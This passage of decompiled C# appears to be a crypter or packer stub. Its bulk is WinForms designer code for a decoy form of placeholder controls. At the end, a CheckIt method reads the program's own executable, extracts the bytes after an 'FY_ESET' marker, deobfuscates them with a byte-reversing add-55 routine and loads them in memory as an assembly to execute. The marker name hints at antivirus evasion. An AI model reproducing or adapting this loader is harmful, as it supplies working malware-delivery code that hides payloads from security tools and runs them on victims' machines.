		((ToolStripItem)BindingNavigatorSeparator).set_Name("BindingNavigatorSeparator");
		ToolStripSeparator bindingNavigatorSeparator = BindingNavigatorSeparator;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator).set_Size(size);
		((ToolStripItem)BindingNavigatorPositionItem).set_AccessibleName("Position");
		((ToolStripItem)BindingNavigatorPositionItem).set_AutoSize(false);
		((ToolStripItem)BindingNavigatorPositionItem).set_Name("BindingNavigatorPositionItem");
		ToolStripTextBox bindingNavigatorPositionItem = BindingNavigatorPositionItem;
		size = new Size(50, 23);
		((ToolStripControlHost)bindingNavigatorPositionItem).set_Size(size);
		((ToolStripControlHost)BindingNavigatorPositionItem).set_Text("0");
		((ToolStripItem)BindingNavigatorPositionItem).set_ToolTipText("Position actuelle");
		((ToolStripItem)BindingNavigatorCountItem).set_Name("BindingNavigatorCountItem");
		ToolStripLabel bindingNavigatorCountItem = BindingNavigatorCountItem;
		size = new Size(37, 22);
		((ToolStripItem)bindingNavigatorCountItem).set_Size(size);
		((ToolStripItem)BindingNavigatorCountItem).set_Text("de {0}");
		((ToolStripItem)BindingNavigatorCountItem).set_ToolTipText("Nombre total d'éléments");
		((ToolStripItem)BindingNavigatorSeparator1).set_Name("BindingNavigatorSeparator");
		ToolStripSeparator bindingNavigatorSeparator2 = BindingNavigatorSeparator1;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator2).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveNextItem.Image"));
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Name("BindingNavigatorMoveNextItem");
		((ToolStripItem)BindingNavigatorMoveNextItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveNextItem = BindingNavigatorMoveNextItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveNextItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Text("Déplacer vers le bas");
		((ToolStripItem)BindingNavigatorMoveLastItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveLastItem.Image"));
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Name("BindingNavigatorMoveLastItem");
		((ToolStripItem)BindingNavigatorMoveLastItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveLastItem = BindingNavigatorMoveLastItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveLastItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Text("Placer en dernier");
		((ToolStripItem)BindingNavigatorSeparator2).set_Name("BindingNavigatorSeparator");
		ToolStripSeparator bindingNavigatorSeparator3 = BindingNavigatorSeparator2;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator3).set_Size(size);
		((ToolStripItem)BindingNavigatorAddNewItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorAddNewItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorAddNewItem.Image"));
		((ToolStripItem)BindingNavigatorAddNewItem).set_Name("BindingNavigatorAddNewItem");
		((ToolStripItem)BindingNavigatorAddNewItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorAddNewItem = BindingNavigatorAddNewItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorAddNewItem).set_Size(size);
		((ToolStripItem)BindingNavigatorAddNewItem).set_Text("Ajouter nouveau");
		((ToolStripItem)BindingNavigatorDeleteItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorDeleteItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorDeleteItem.Image"));
		((ToolStripItem)BindingNavigatorDeleteItem).set_Name("BindingNavigatorDeleteItem");
		((ToolStripItem)BindingNavigatorDeleteItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorDeleteItem = BindingNavigatorDeleteItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorDeleteItem).set_Size(size);
		((ToolStripItem)BindingNavigatorDeleteItem).set_Text("Supprimer");
		Button button3 = Button2;
		location = new Point(0, 0);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(8);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(8, 8);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(9);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox2).set_FormattingEnabled(true);
		ComboBox comboBox3 = ComboBox2;
		location = new Point(0, 0);
		((Control)comboBox3).set_Location(location);
		((Control)ComboBox2).set_Name("ComboBox2");
		ComboBox comboBox4 = ComboBox2;
		size = new Size(121, 21);
		((Control)comboBox4).set_Size(size);
		((Control)ComboBox2).set_TabIndex(10);
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip1;
		size = new Size(61, 4);
		((Control)contextMenuStrip).set_Size(size);
		DataGridView2.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		DataGridView dataGridView3 = DataGridView2;
		location = new Point(0, 0);
		((Control)dataGridView3).set_Location(location);
		((Control)DataGridView2).set_Name("DataGridView2");
		DataGridView dataGridView4 = DataGridView2;
		size = new Size(240, 150);
		((Control)dataGridView4).set_Size(size);
		((Control)DataGridView2).set_TabIndex(12);
		DateTimePicker dateTimePicker3 = DateTimePicker2;
		location = new Point(8, 8);
		((Control)dateTimePicker3).set_Location(location);
		((Control)DateTimePicker2).set_Name("DateTimePicker2");
		DateTimePicker dateTimePicker4 = DateTimePicker2;
		size = new Size(200, 20);
		((Control)dateTimePicker4).set_Size(size);
		((Control)DateTimePicker2).set_TabIndex(13);
		DirectorySearcher1.set_ClientTimeout(TimeSpan.Parse("-00:00:01"));
		DirectorySearcher1.set_ServerPageTimeLimit(TimeSpan.Parse("-00:00:01"));
		DirectorySearcher1.set_ServerTimeLimit(TimeSpan.Parse("-00:00:01"));
		DomainUpDown domainUpDown = DomainUpDown1;
		location = new Point(0, 0);
		((Control)domainUpDown).set_Location(location);
		((Control)DomainUpDown1).set_Name("DomainUpDown1");
		DomainUpDown domainUpDown2 = DomainUpDown1;
		size = new Size(120, 20);
		((Control)domainUpDown2).set_Size(size);
		((Control)DomainUpDown1).set_TabIndex(14);
		((UpDownBase)DomainUpDown1).set_Text("DomainUpDown1");
		FileSystemWatcher1.EnableRaisingEvents = true;
		FileSystemWatcher1.SynchronizingObject = (ISynchronizeInvoke?)this;
		((FileDialog)OpenFileDialog1).set_FileName("OpenFileDialog1");
		MonthCalendar monthCalendar = MonthCalendar1;
		location = new Point(0, 0);
		((Control)monthCalendar).set_Location(location);
		((Control)MonthCalendar1).set_Name("MonthCalendar1");
		((Control)MonthCalendar1).set_TabIndex(15);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage2);
		TabControl tabControl = TabControl1;
		location = new Point(0, 0);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		size = new Size(200, 100);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(16);
		((Control)TabPage1).get_Controls().Add((Control)(object)SplitContainer1);
		TabPage tabPage = TabPage1;
		location = new Point(4, 22);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(192, 74);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("TabPage1");
		TabPage1.set_UseVisualStyleBackColor(true);
		TabPage tabPage4 = TabPage2;
		location = new Point(4, 22);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(192, 74);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("TabPage2");
		TabPage2.set_UseVisualStyleBackColor(true);
		SplitContainer1.set_Dock((DockStyle)5);
		SplitContainer splitContainer = SplitContainer1;
		location = new Point(3, 3);
		((Control)splitContainer).set_Location(location);
		((Control)SplitContainer1).set_Name("SplitContainer1");
		((Control)SplitContainer1.get_Panel1()).get_Controls().Add((Control)(object)PropertyGrid1);
		SplitContainer splitContainer2 = SplitContainer1;
		size = new Size(186, 68);
		((Control)splitContainer2).set_Size(size);
		SplitContainer1.set_SplitterDistance(62);
		((Control)SplitContainer1).set_TabIndex(0);
		PropertyGrid propertyGrid = PropertyGrid1;
		location = new Point(0, 0);
		((Control)propertyGrid).set_Location(location);
		((Control)PropertyGrid1).set_Name("PropertyGrid1");
		PropertyGrid propertyGrid2 = PropertyGrid1;
		size = new Size(130, 130);
		((Control)propertyGrid2).set_Size(size);
		((Control)PropertyGrid1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TabControl1);
		((Control)this).get_Controls().Add((Control)(object)MonthCalendar1);
		((Control)this).get_Controls().Add((Control)(object)DomainUpDown1);
		((Control)this).get_Controls().Add((Control)(object)DateTimePicker2);
		((Control)this).get_Controls().Add((Control)(object)DataGridView2);
		((Control)this).get_Controls().Add((Control)(object)ComboBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)BindingNavigator1);
		((Control)this).get_Controls().Add((Control)(object)DateTimePicker1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Control");
		((Form)this).set_Text("Control");
		((ISupportInitialize)DataGridView1).EndInit();
		((ISupportInitialize)ErrorProvider1).EndInit();
		((ISupportInitialize)EventLog1).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((ISupportInitialize)BindingNavigator1).EndInit();
		((Control)BindingNavigator1).ResumeLayout(false);
		((Control)BindingNavigator1).PerformLayout();
		((ISupportInitialize)BindingSource1).EndInit();
		((ISupportInitialize)DataGridView2).EndInit();
		((ISupportInitialize)FileSystemWatcher1).EndInit();
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)SplitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)SplitContainer1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string G(byte[] A)
	{
		return Encoding.Default.GetString(A);
	}

	public byte[] G(string A)
	{
		return Encoding.Default.GetBytes(A);
	}

	private void CheckIt()
	{
		byte[] a = File.ReadAllBytes(Application.get_ExecutablePath());
		a = Encoding.Default.GetBytes(Strings.Split(G(a), "FY_ESET", -1, (CompareMethod)0)[1]);
		a = Chiki(ref a, 55);
		Assembly.Load(a).GetType("L.L")!.InvokeMember("L", BindingFlags.InvokeMethod, null, null, null);
	}

	public static byte[] Chiki(ref byte[] input, int key)
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = input.Length - 4;
		for (int i = 0; i <= num; i += 4)
		{
			int num2 = 3;
			do
			{
				memoryStream.Write(new byte[1] { (byte)(input[i + num2] + key) }, 0, 1);
				num2 += -1;
			}
			while (num2 >= 0);
		}
		input = memoryStream.ToArray();
		memoryStream.Close();
		return input;
	}

	private void GroupBox1_Enter(object sender, EventArgs e)
	{
	}

	private void CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
	}

	private void CheckIt(object sender, EventArgs e)
	{
	}

	private void DateTimePicker1_ValueChanged(object sender, EventArgs e)
	{
	}

	private void HScrollBar1_Scroll(object sender, ScrollEventArgs e)
	{
	}
}
